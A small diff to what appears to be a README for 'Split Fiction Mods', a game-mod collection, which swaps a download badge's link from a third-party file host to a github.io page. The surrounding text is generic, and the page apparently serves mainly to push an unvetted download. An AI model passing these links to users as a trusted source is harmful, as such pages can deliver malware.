@@ -1,6 +1,6 @@
 **Split Fiction Mods** is a collection of game modifications designed to enhance and transform the gaming experience. Below is a detailed description of what these mods typically offer:
 
-[![Download Split Fiction Mods](https://img.shields.io/badge/Download-SplitFiction%20mod-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Split Fiction Mods](https://img.shields.io/badge/Download-SplitFiction%20mod-blueviolet)](https://split-fiction-mods.github.io/.github/)
 
 1. **Alternate Realities**: Split Fiction Mods introduce alternate timelines or universes, allowing players to explore what might have happened if key events or decisions in the original game played out differently.
 
